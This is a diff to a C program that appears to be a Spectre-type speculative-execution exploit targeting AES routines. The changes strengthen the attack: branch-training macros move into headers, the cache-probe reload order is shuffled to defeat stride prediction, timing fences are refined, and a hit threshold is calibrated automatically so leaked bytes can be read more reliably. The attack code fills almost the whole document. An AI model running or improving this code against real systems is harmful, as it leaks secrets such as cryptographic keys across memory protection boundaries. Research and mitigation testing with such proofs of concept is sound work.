@@ -16,6 +16,7 @@
 #include <stdlib.h>
 #include <stdint.h>
 #include "portable/we_portable.h"
+#include "portable/we_cache_probe.h"
 #ifdef _MSC_VER
 #include <windows.h>
 #include <wmmintrin.h>
@@ -24,6 +25,9 @@
 #else
 #include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
 #endif
+#include "portable/we_cpu_features.h"
+#include "portable/we_cache_timing_sweep.h"
+#include "portable/we_spectre_train.h"
 
 extern void AES_128_encrypt(unsigned char *out, unsigned char *in);
 extern void AES_128_encrypt_intrin(unsigned char *out, unsigned char *in);
@@ -58,7 +62,7 @@ uint8_t array1[160] = {
 	16
 };
 uint8_t unused2[64];
-uint8_t array2[256 * 512 * 16];
+uint8_t array2[256 * WE_PROBE_STRIDE * 16];
 
 //uint32_t sec[] = { 0x1c1c1c1c, 0x80880080, 0xc4c4c4c4, 0x4c4c4c4c };
 char* buf = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
@@ -71,45 +75,7 @@ uint8_t tmp = 0; /* Used so compiler won't optimize out victim_function() */
 Analysis code
 ********************************************************************/
 #ifdef NOCLFLUSH
-#define CACHE_FLUSH_ITERATIONS 2048
-#define CACHE_FLUSH_STRIDE 4096
-uint8_t cache_flush_array[CACHE_FLUSH_STRIDE * CACHE_FLUSH_ITERATIONS];
-
-/* Flush memory using long SSE instructions */
-void flush_memory_sse(uint8_t * addr)
-{
-	float * p = (float *)addr;
-	float c = 0.f;
-	__m128 i = _mm_setr_ps(c, c, c, c);
-
-	int k, l;
-	/* Non-sequential memory addressing by looping through k by l */
-	for (k = 0; k < 4; k++)
-		for (l = 0; l < 4; l++)
-			_mm_stream_ps(&p[(l * 4 + k) * 4], i);
-}
-#endif
-
-#ifndef NOCLFLUSH
-#define TrainCall(Func) for (j = 29; j >= 0; j--) {\
-_mm_clflush(&array1_size);\
-for (volatile int z = 0; z < 100; z++) {}\
-x = ((j % 6) - 1) & ~0xFFFF;\
-x = (x | (x >> 16));\
-x = training_x ^ (x & (malicious_x ^ training_x));\
-Func(x);\
-}
-#else
-#define TrainCall(Func) for (j = 29; j >= 0; j--) {\
-for (l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0; l -= CACHE_FLUSH_STRIDE) {\
-	junk2 = cache_flush_array[l];\
-}\
-for (volatile int z = 0; z < 100; z++) {}\
-x = ((j % 6) - 1) & ~0xFFFF;\
-x = (x | (x >> 16));\
-x = training_x ^ (x & (malicious_x ^ training_x));\
-Func(x);\
-}
+uint8_t cache_flush_array[WE_CACHE_FLUSH_STRIDE * WE_CACHE_FLUSH_ITERATIONS];
 #endif
 
 /* Report best guess in value[0] and runner-up in value[1] */
@@ -119,6 +85,8 @@ void readMemory128(int cache_hit_threshold, size_t malicious_x, uint8_t value[2 
 	size_t training_x, x;
 	register uint64_t time1, time2;
 	volatile uint8_t * addr;
+	uint8_t probe_order[256];
+	uint32_t probe_state = (uint32_t)__rdtsc() | 1U;
 
 #ifdef NOCLFLUSH
 	int junk2 = 0;
@@ -130,13 +98,13 @@ void readMemory128(int cache_hit_threshold, size_t malicious_x, uint8_t value[2 
 			results[i2][i] = 0;
 		}
 	}
-	for (tries = 999; tries > 0; tries--) {
+	for (tries = WE_MAX_TRIES; tries > 0; tries--) {
 
 #ifndef NOCLFLUSH
 		/* Flush array2[256*(0..255)] from cache */
 		for (i2 = 0; i2 < 16; i2++) {
 			for (i = 0; i < 256; i++) {
-				_mm_clflush(&array2[i2 * 512 * 256 + i * 512]); /* intrinsic for clflush instruction */
+				_mm_clflush(&array2[i2 * WE_PROBE_STRIDE * 256 + i * WE_PROBE_STRIDE]); /* intrinsic for clflush instruction */
 			}
 		}
 #else
@@ -145,7 +113,7 @@ void readMemory128(int cache_hit_threshold, size_t malicious_x, uint8_t value[2 
 		for (j = 0; j < 16; j++)
 			for (i2 = 0; i2 < 16; i2++) {
 				for (i = 0; i < 256; i++) {
-					flush_memory_sse(&array2[i2 * 512 * 256 + i * 512]);
+					we_flush_memory_sse(&array2[i2 * WE_PROBE_STRIDE * 256 + i * WE_PROBE_STRIDE]);
 				}
 			}
 #endif
@@ -155,67 +123,44 @@ void readMemory128(int cache_hit_threshold, size_t malicious_x, uint8_t value[2 
 		unsigned char c[16];
 
  		if (idx == 0) { AES_128_encrypt(c, &array1[training_x]);
-			TrainCall(victim_function_aes); }
+			WE_TRAIN_CALL(victim_function_aes(x)); }
 		else if (idx == 1) { AES_128_encrypt_intrin(c, &array1[training_x]); 
-			TrainCall(victim_function_aes_intrin); }
+			WE_TRAIN_CALL(victim_function_aes_intrin(x)); }
 		else if (idx == 2) { AES_encrypt_round1(&array1[training_x], c);
-			TrainCall(victim_function_aes_round1); }
+			WE_TRAIN_CALL(victim_function_aes_round1(x)); }
 		else if (idx == 3) { AES_encrypt_intrin_round1(&array1[training_x], c);
-			TrainCall(victim_function_aes_intrin_round1); }
+			WE_TRAIN_CALL(victim_function_aes_intrin_round1(x)); }
 
-		/* Time reads. Order is lightly mixed up to prevent stride prediction */
+		/* Shuffle each reload walk to avoid a learnable address stride. */
 		for (i2 = 0; i2 < 16; i2++) {
+			we_shuffle_probe_order(probe_order, &probe_state);
 			for (i = 0; i < 256; i++) {
-				mix_i = ((i * 167) + 13) & 255;
-				addr = &array2[i2 * 512 * 256 + mix_i * 512];
-
-				/*
-				We need to accuratly measure the memory access to the current index of the
-				array so we can determine which index was cached by the malicious mispredicted code.
-
-				The best way to do this is to use the rdtscp instruction, which measures current
-				processor ticks, and is also serialized.
-				*/
+				mix_i = probe_order[i];
+				addr = &array2[i2 * WE_PROBE_STRIDE * 256 + mix_i * WE_PROBE_STRIDE];
 
 #ifndef NORDTSCP
-				time1 = __rdtscp(&junk); /* READ TIMER */
-				junk = *addr; /* MEMORY ACCESS TO TIME */
-				time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
+				time1 = __rdtscp(&junk);
+				junk = *addr;
+				time2 = __rdtscp(&junk) - time1;
 #else
-
-				/*
-				The rdtscp instruction was instroduced with the x86-64 extensions.
-				Many older 32-bit processors won't support this, so we need to use
-				the equivalent but non-serialized tdtsc instruction instead.
-				*/
-
+#if defined(_MSC_VER) && defined(_M_IX86)
+				time2 = we_rdtsc_probe_x86(addr);
+#else
 #ifndef NOMFENCE
-				/*
-				Since the rdstc instruction isn't serialized, newer processors will try to
-				reorder it, ruining its value as a timing mechanism.
-				To get around this, we use the mfence instruction to introduce a memory
-				barrier and force serialization. mfence is used because it is portable across
-				Intel and AMD.
-				*/
-
-				_mm_mfence();
-				time1 = __rdtsc(); /* READ TIMER */
-				_mm_mfence();
-				junk = *addr; /* MEMORY ACCESS TO TIME */
-				_mm_mfence();
-				time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
-				_mm_mfence();
-#else
-				/*
-				The mfence instruction was introduced with the SSE2 instruction set, so
-				we have to ifdef it out on pre-SSE2 processors.
-				Luckily, these older processors don't seem to reorder the rdtsc instruction,
-				so not having mfence on older processors is less of an issue.
-				*/
-
-				time1 = __rdtsc(); /* READ TIMER */
-				junk = *addr; /* MEMORY ACCESS TO TIME */
-				time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
+				_mm_lfence();
+#endif
+				time1 = __rdtsc();
+#ifndef NOMFENCE
+				_mm_lfence();
+#endif
+				junk = *addr;
+#ifndef NOMFENCE
+				_mm_lfence();
+#endif
+				time2 = __rdtsc() - time1;
+#ifndef NOMFENCE
+				_mm_lfence();
+#endif
 #endif
 #endif
 				if (time2 <= cache_hit_threshold && mix_i != c[(i2 & 12) + (3 - (i2 & 3))])//array1[tries % array1_size]) //(i2 / 4) * 4 + (3 - i2 % 4)
@@ -261,9 +206,13 @@ void readMemory128(int cache_hit_threshold, size_t malicious_x, uint8_t value[2 
 */
 int main(int argc,
 	const char * * argv) {
+	we_cpu_features cpu = we_detect_cpu_features();
+	if (!we_check_cpu_features(cpu)) return 2;
+	we_configure_probe_timer(cpu);
+	we_pin_cpu_from_env();
 
-	/* Default to a cache hit threshold of 80 */
-	int cache_hit_threshold = 80;
+	/* Calibrate by default; an explicit threshold remains available. */
+	int cache_hit_threshold = -1;
 
 	/* Default for malicious_x is the secret string address */
 	size_t malicious_x = 0;// (size_t)(secret - (char *)array1);
@@ -287,6 +236,18 @@ int main(int argc,
 	(OPTIONAL) */
 	if (argc >= 2) {
 		sscanf(argv[1], "%d", &cache_hit_threshold);
+	}
+	if (cache_hit_threshold < 0) {
+		we_cache_calibration calibration = we_calibrate_cache_threshold(array2, 16);
+		printf("Cache timing: hot p90=%llu, cold p10=%llu, full sweep cold p01=%llu cycles.\n",
+			(unsigned long long)calibration.hot_p90,
+			(unsigned long long)calibration.cold_p10,
+			(unsigned long long)calibration.sweep_cold_p01);
+		if (!calibration.valid) {
+			fprintf(stderr, "Cache timing calibration failed: hot and cold probe loads overlap; check timer/flush support or choose a different CPU.\n");
+			return 2;
+		}
+		cache_hit_threshold = calibration.threshold;
 	}
 
 	/* Parse the malicious x address and length from the second and third
@@ -316,9 +277,9 @@ int main(int argc,
 	printf("RDTSCP_NOT_SUPPORTED ");
 #endif
 #ifndef NOMFENCE
-	printf("MFENCE_SUPPORTED ");
+	printf("SSE2_TIMER_FENCES ");
 #else
-	printf("MFENCE_NOT_SUPPORTED ");
+	printf("NO_TIMER_FENCES ");
 #endif
 #ifndef NOCLFLUSH
 	printf("CLFLUSH_SUPPORTED ");
@@ -345,6 +306,10 @@ int main(int argc,
 	//while (--len >= 0) {
 		//printf("Reading at malicious_x = %p... ", (void *)malicious_x);
 	for (int j = 0; j < 4; j++) {
+		if ((j == 1 || j == 3) && !cpu.aesni) {
+			puts("Skipping AES-NI mode: this CPU does not advertise AES-NI.");
+			continue;
+		}
 		char outbuf[16];
 		QueryPerformanceCounter(&start);
 		for (int k = 0; k < 10000; k++) {
